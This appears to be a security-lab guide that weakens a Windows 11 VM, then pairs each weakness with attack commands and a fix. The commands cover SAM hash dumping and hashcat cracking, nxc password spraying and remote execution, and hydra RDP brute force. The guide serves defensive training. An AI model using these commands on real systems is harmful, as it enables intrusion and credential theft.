# 🪟 Windows 11 — deharden → exploit → harden

This guide walks through the Windows 11 dehardening script. It is the **endpoint** counterpart of the
[Windows Server 2019 guide](windows-server-2019.md): same four-part, fully reproducible pattern, but
focused on the controls that matter on a workstation (a user running as local admin, remote admin with
local accounts, an open SMB share, RDP without NLA, no auditing, Defender + SmartScreen off).

- 🧪 **Seeded by the script** — the exact artifact you can test (a user, a policy, a service).
- 🟠 **Exploit** — concrete commands *and the result you should see*.
- 🟢 **Harden** — the fix.
- ✅ **Re-test** — run the same attack again and confirm it now fails.

- **Script:** [`scripts/windows-11/Deharden-Windows11.ps1`](../scripts/windows-11/Deharden-Windows11.ps1) (PowerShell)
- **New to the lab?** Read [lab-setup.md](lab-setup.md) first.

> [!WARNING]
> This script weakens the machine on purpose. Run it **only** in an isolated lab VM (Host-Only
> network) with a **fresh snapshot**. To recover a safe state, restore the snapshot.

## How to run the script

```powershell
# PowerShell AS ADMINISTRATOR
Set-ExecutionPolicy -Scope Process Bypass -Force
.\Deharden-Windows11.ps1               # type DEHARDEN to confirm
# .\Deharden-Windows11.ps1 -Force       # unattended
# .\Deharden-Windows11.ps1 -ComputerName lab-win11   # also rename the box
Restart-Computer                        # Defender + computer rename need a reboot
```

> [!IMPORTANT]
> **Turn off Tamper Protection first.** No script can disable it. Go to *Windows Security → Virus &
> threat protection → Manage settings* and switch **Tamper Protection** off, then run the script. If
> it is still on, the script warns you and skips the Defender step.

> [!NOTE]
> **Windows 11 edition.** Remote Desktop and the Group Policy editor only exist on **Pro / Enterprise /
> Education**. On Home, the RDP row won't apply and some hardening is registry-only. The script warns
> you if it detects Home.

- **Backup:** `C:\deharden-backups-<date>\secpol-BEFORE.cfg` · **Log:** `C:\deharden-lab.log`
- **Demo account it creates:** `trainee / Password1`, made a **local administrator** — a realistic
  "everyday user runs as admin" laptop. The password is weak **and present in `rockyou.txt`**, so the
  cracking and spraying demos below actually succeed. A hardened policy (length 14 + complexity) would
  reject it.

## Attacker box prerequisites

The 🟠 commands run from the attacker VM (e.g. Kali): `nmap`, `hydra`, `hashcat`, `netexec` (`nxc`),
`impacket` (`secretsdump.py`), `xfreerdp` and the wordlist.

```bash
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
export HOST=192.168.56.40      # <-- the victim's IP (ipconfig on the victim)
```

---

## 1. Weak password policy → crack a password offline with hashcat ⭐

The weak policy lets `trainee` keep the trivial password `Password1`, and because it's in a wordlist,
offline cracking is instant.

- 🧪 **Seeded:** `net accounts` → min length `0`, complexity `off`, no expiry; user `trainee` with the
  weak, wordlist-present password `Password1`.
- 🟠 **Exploit:**
  ```powershell
  # on the victim as the lab operator (admin PowerShell), then copy the files to Kali:
  reg save HKLM\SAM    C:\sam.save
  reg save HKLM\SYSTEM C:\system.save
  ```
  ```bash
  # ...then on the attacker:
  secretsdump.py -sam sam.save -system system.save LOCAL
  #  => trainee:1001:aad3b435...:3dbde697d71690a769204beb12283678:::
  echo '3dbde697d71690a769204beb12283678' > ntlm.txt
  hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt
  #  => 3dbde697d71690a769204beb12283678:Password1
  ```
  NTLM is unsalted and extremely fast to compute, so a weak password that appears in any wordlist is
  recovered almost immediately. **That is why the password policy matters.**
- 🟢 **Harden:** `net accounts /minpwlen:14 /maxpwage:365 /uniquepw:24` and enable complexity in
  `secpol.msc` (*Account Policies → Password Policy*); then set a long, random password for `trainee`.
- ✅ **Re-test:** dump again and run the same hashcat command — a 14-char random password is not in
  `rockyou.txt`, so the wordlist is exhausted with no hit.

## 2. Account lockout disabled → unlimited password spraying
- 🧪 **Seeded:** `net accounts` lockout threshold `0` (accounts never lock); `trainee / Password1`.
- 🟠 **Exploit:**
  ```bash
  nxc smb $HOST -u trainee -p /usr/share/wordlists/rockyou.txt
  #  => [+] <HOST>\trainee:Password1   (and the run NEVER triggers a lockout)
  ```
- 🟢 **Harden:** `net accounts /lockoutthreshold:10 /lockoutduration:15 /lockoutwindow:15` (Windows 11's
  own default is 10).
- ✅ **Re-test:** after 10 bad attempts the account locks — `nxc` reports `STATUS_ACCOUNT_LOCKED_OUT`.

## 3. Local-admin user + remote admin with local accounts → lateral movement
- 🧪 **Seeded:** `trainee` is a member of the **Administrators** group, and
  `LocalAccountTokenFilterPolicy=1` so that local accounts get a full token over the network.
- 🟠 **Exploit:**
  ```bash
  nxc smb $HOST -u trainee -p 'Password1'
  #  => [+] <HOST>\trainee:Password1 (Pwn3d!)   -- local admin, usable remotely
  nxc smb $HOST -u trainee -p 'Password1' -x 'whoami'      # run commands remotely
  nxc smb $HOST -u trainee -p 'Password1' --sam            # dump the local hashes
  ```
  A single compromised everyday account is already full admin of the endpoint, remotely.
- 🟢 **Harden:** remove the user from the admins group (`Remove-LocalGroupMember -SID 'S-1-5-32-544'
  -Member trainee`) so day-to-day work runs with least privilege; set
  `LocalAccountTokenFilterPolicy=0`. In a domain, use LAPS for the real local admin.
- ✅ **Re-test:** `nxc smb $HOST -u trainee -p 'Password1'` no longer shows `(Pwn3d!)`; remote command
  execution and `--sam` are denied.

## 4. SMB exposed with an open share → read internal files unauthenticated-style
- 🧪 **Seeded:** network profile forced to **Private**, `LanmanServer` running, and a share
  `\\HOST\Shared` (`C:\Shared`) with **Full Control for Everyone**; the 24H2 failed-auth delay set to
  `0 ms`.
- 🟠 **Exploit:**
  ```bash
  nxc smb $HOST -u trainee -p 'Password1' --shares   # => 'Shared' READ,WRITE
  smbclient //$HOST/Shared -U trainee%Password1 -c 'get customers.txt'
  ```
  An over-shared folder leaks internal data to anyone who can authenticate (and the removed delay lets
  the row-2 spraying run full speed).
- 🟢 **Harden:** remove the share (`Remove-SmbShare -Name Shared`) or scope its NTFS + share
  permissions to named groups only; restore the SMB auth delay by removing the override; put the LAN
  back on the **Public** profile where inbound SMB is blocked.
- ✅ **Re-test:** `--shares` no longer lists `Shared` (or shows no access); `smbclient` is denied.

## 5. RDP active and NLA off → brute force the desktop
- 🧪 **Seeded:** RDP enabled (`fDenyTSConnections=0`), `TermService` started, `UserAuthentication=0`
  (NLA off). `trainee` is a local admin, so it can sign in over RDP.
- 🟠 **Exploit:**
  ```bash
  nmap -p3389 --script rdp-ntlm-info $HOST      # leaks hostname/OS without authenticating
  hydra -l trainee -P /usr/share/wordlists/rockyou.txt rdp://$HOST
  #  => login: trainee  password: Password1
  xfreerdp /u:trainee /p:Password1 /v:$HOST /cert:ignore
  ```
- 🟢 **Harden:** if RDP isn't needed, turn it off (`Set-Reg … fDenyTSConnections 1`, stop
  `TermService`); otherwise re-enable NLA (`UserAuthentication=1`) and restrict who may connect.
- ✅ **Re-test:** `rdp-ntlm-info` no longer leaks pre-auth; NLA forces authentication before a session.

## 6. Firewall disabled (all 3 profiles)
- 🧪 **Seeded:** Domain/Private/Public profiles all set to `Enabled False`.
- 🟠 **Exploit:** `nmap -sS -p- $HOST` → exposes 135/139/445 (SMB/RPC) and 3389 (RDP), etc.
- 🟢 **Harden:** `Set-NetFirewallProfile -All -Enabled True -DefaultInboundAction Block -LogBlocked True`.
- ✅ **Re-test:** `nmap -sS -p- $HOST` now shows only explicitly allowed ports.

## 7. Auditing disabled (no 4625 / 4688 / 4740)
- 🧪 **Seeded:** every audit subcategory set to "no auditing"; command line stripped from event 4688.
- 🟠 **Exploit:**
  ```bash
  nxc smb $HOST -u trainee -p 'WrongPassword'   # a failed logon...
  ```
  ```powershell
  Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625} -MaxEvents 5   # ...leaves NO 4625 event
  ```
  Failed logons (4625), account lockouts (4740) and process creation (4688) leave no trail for a SOC.
- 🟢 **Harden:** `auditpol /set /category:* /success:enable /failure:enable` and re-enable the command
  line in event 4688 (`ProcessCreationIncludeCmdLine_Enabled=1`).
- ✅ **Re-test:** the same failed logon now produces a 4625 event with full detail.

## 8. Defender real-time protection and SmartScreen disabled
- 🧪 **Seeded:** real-time protection off (`DisableRealtimeMonitoring`), cloud/sample submission off,
  and Windows + Edge SmartScreen disabled.
- 🟠 **Exploit:**
  ```powershell
  Get-MpComputerStatus | Select RealTimeProtectionEnabled   # => False
  ```
  Dropping a standard [EICAR test file](https://www.eicar.org/download-anti-malware-testfile/) on the
  endpoint is **not** flagged, and a downloaded executable runs with no SmartScreen prompt — a real
  payload would land just as quietly.
- 🟢 **Harden:**
  ```powershell
  # remove the policy that forces real-time protection off, then re-enable it
  Remove-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' `
              -Recurse -ErrorAction SilentlyContinue
  Set-MpPreference -DisableRealtimeMonitoring $false
  Set-MpPreference -DisableIOAVProtection    $false
  # re-enable SmartScreen (and turn Tamper Protection back on in the UI)
  Remove-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\System' EnableSmartScreen -ErrorAction SilentlyContinue
  Remove-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Edge' SmartScreenEnabled -ErrorAction SilentlyContinue
  ```
- ✅ **Re-test:** `Get-MpComputerStatus | Select RealTimeProtectionEnabled, AntivirusEnabled` → both
  `True`; writing the EICAR test file is quarantined on contact.

---

## Suggested loop

For each row: **exploit → harden → re-run the exact same attack and confirm it fails.** Restore the
`fresh` snapshot before the next session so you always start from a known state.

➡️ Other targets: [Windows Server 2019 guide](windows-server-2019.md) · [Ubuntu Desktop guide](ubuntu-desktop.md)
